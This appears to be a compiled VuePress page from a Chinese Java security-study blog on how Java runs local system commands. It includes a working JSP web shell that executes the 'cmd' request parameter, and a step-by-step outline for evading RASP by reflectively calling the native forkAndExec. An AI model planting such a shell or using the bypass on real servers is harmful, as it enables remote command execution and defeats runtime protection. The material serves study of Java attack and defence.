import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as n,o as i}from"./app-DS0ZCcmM.js";const l={};function t(p,e){return i(),a("div",null,e[0]||(e[0]=[n(`<h1 id="本地命令执行" tabindex="-1"><a class="header-anchor" href="#本地命令执行"><span>本地命令执行</span></a></h1><h3 id="runtime" tabindex="-1"><a class="header-anchor" href="#runtime"><span>Runtime</span></a></h3><p>java.lang.Runtime的exec方法可执行本地系统命令</p><p>调用链</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)</span></span>
<span class="line"><span>java.lang.ProcessImpl.start(ProcessImpl.java:134)</span></span>
<span class="line"><span>java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)</span></span>
<span class="line"><span>java.lang.Runtime.exec(Runtime.java:620)</span></span>
<span class="line"><span>java.lang.Runtime.exec(Runtime.java:450)</span></span>
<span class="line"><span>java.lang.Runtime.exec(Runtime.java:347)</span></span>
<span class="line"><span>org.apache.jsp.runtime_002dexec2_jsp._jspService(runtime_002dexec2_jsp.java:118)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>Runtime</code>和<code>ProcessBuilder</code>并不是程序的最终执行点</p><h3 id="processbuilder" tabindex="-1"><a class="header-anchor" href="#processbuilder"><span>ProcessBuilder</span></a></h3><p><code>Runtime</code>命令执行的时候其最终<code>exec</code>方法会调用<code>ProcessBuilder</code>来执行本地命令</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%--</span></span>
<span class="line"><span>  Created by IntelliJ IDEA.</span></span>
<span class="line"><span>  User: yz</span></span>
<span class="line"><span>  Date: 2019/12/6</span></span>
<span class="line"><span>  Time: 10:26 上午</span></span>
<span class="line"><span>  To change this template use File | Settings | File Templates.</span></span>
<span class="line"><span>--%&gt;</span></span>
<span class="line"><span>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    InputStream in = new ProcessBuilder(request.getParameterValues(&quot;cmd&quot;)).start().getInputStream();</span></span>
<span class="line"><span>    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span></span>
<span class="line"><span>    byte[] b = new byte[1024];</span></span>
<span class="line"><span>    int a = -1;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    while ((a = in.read(b)) != -1) {</span></span>
<span class="line"><span>        baos.write(b, 0, a);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    out.write(&quot;&lt;pre&gt;&quot; + new String(baos.toByteArray()) + &quot;&lt;/pre&gt;&quot;);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240303165522466.png" alt="image-20240303165522466" tabindex="0" loading="lazy"><figcaption>image-20240303165522466</figcaption></figure><h3 id="unixprocess-processimpl" tabindex="-1"><a class="header-anchor" href="#unixprocess-processimpl"><span>UNIXProcess/ProcessImpl</span></a></h3><p><code>UNIXProcess</code>和<code>ProcessImpl</code>其实就是最终调用<code>native</code>执行系统命令的类，这个类提供了一个叫<code>forkAndExec</code>的native方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令。</p><h3 id="绕过rasp命令执行" tabindex="-1"><a class="header-anchor" href="#绕过rasp命令执行"><span>绕过RASP命令执行</span></a></h3><p>主要学习思路</p><ol><li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>UNIXProcess/ProcessImpl</code>类对象。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>forkAndExec</code>方法。</li><li>构造<code>forkAndExec</code>需要的参数并调用。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>initStreams</code>方法初始化输入输出结果流对象。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>getInputStream</code>方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li></ol><h3 id="jni" tabindex="-1"><a class="header-anchor" href="#jni"><span>JNI</span></a></h3><p>Java可以通过JNI的方式调用动态链接库，我们只需要在动态链接库中写一个本地命令执行的方法就行了</p><p><a href="https://www.javasec.org/javase" target="_blank" rel="noopener noreferrer">javasec</a></p>`,18)]))}const o=s(l,[["render",t],["__file","本地命令执行.html.vue"]]),d=JSON.parse('{"path":"/Java%E5%AD%A6%E4%B9%A0/Java%E5%9F%BA%E7%A1%80/%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html","title":"本地命令执行","lang":"zh-CN","frontmatter":{"description":"本地命令执行 Runtime java.lang.Runtime的exec方法可执行本地系统命令 调用链 Runtime和ProcessBuilder并不是程序的最终执行点 ProcessBuilder Runtime命令执行的时候其最终exec方法会调用ProcessBuilder来执行本地命令 image-20240303165522466imag...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/Java%E5%AD%A6%E4%B9%A0/Java%E5%9F%BA%E7%A1%80/%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"本地命令执行"}],["meta",{"property":"og:description","content":"本地命令执行 Runtime java.lang.Runtime的exec方法可执行本地系统命令 调用链 Runtime和ProcessBuilder并不是程序的最终执行点 ProcessBuilder Runtime命令执行的时候其最终exec方法会调用ProcessBuilder来执行本地命令 image-20240303165522466imag..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240303165522466.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"本地命令执行\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240303165522466.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":3,"title":"Runtime","slug":"runtime","link":"#runtime","children":[]},{"level":3,"title":"ProcessBuilder","slug":"processbuilder","link":"#processbuilder","children":[]},{"level":3,"title":"UNIXProcess/ProcessImpl","slug":"unixprocess-processimpl","link":"#unixprocess-processimpl","children":[]},{"level":3,"title":"绕过RASP命令执行","slug":"绕过rasp命令执行","link":"#绕过rasp命令执行","children":[]},{"level":3,"title":"JNI","slug":"jni","link":"#jni","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":1.28,"words":383},"filePathRelative":"Java学习/Java基础/本地命令执行.md","localizedDate":"2025年1月16日","excerpt":"\\n<h3>Runtime</h3>\\n<p>java.lang.Runtime的exec方法可执行本地系统命令</p>\\n<p>调用链</p>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)</span></span>\\n<span class=\\"line\\"><span>java.lang.ProcessImpl.start(ProcessImpl.java:134)</span></span>\\n<span class=\\"line\\"><span>java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)</span></span>\\n<span class=\\"line\\"><span>java.lang.Runtime.exec(Runtime.java:620)</span></span>\\n<span class=\\"line\\"><span>java.lang.Runtime.exec(Runtime.java:450)</span></span>\\n<span class=\\"line\\"><span>java.lang.Runtime.exec(Runtime.java:347)</span></span>\\n<span class=\\"line\\"><span>org.apache.jsp.runtime_002dexec2_jsp._jspService(runtime_002dexec2_jsp.java:118)</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{o as comp,d as data};
